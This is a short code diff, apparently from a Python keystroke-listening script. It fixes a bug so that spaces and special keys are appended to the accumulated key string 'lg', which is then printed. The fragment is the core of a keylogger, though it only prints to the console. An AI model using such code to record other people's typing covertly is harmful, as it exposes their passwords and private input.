@@ -11,9 +11,9 @@ def listening_function(key):
         lg += str(key.char)
     except  AttributeError:
         if key == key.space:
-            log = lg + " "
+            lg = lg + " "
         else:
-            log = lg + str(key)
+            lg = lg + str(key)
     except:
         print("Error!")
     print(lg)
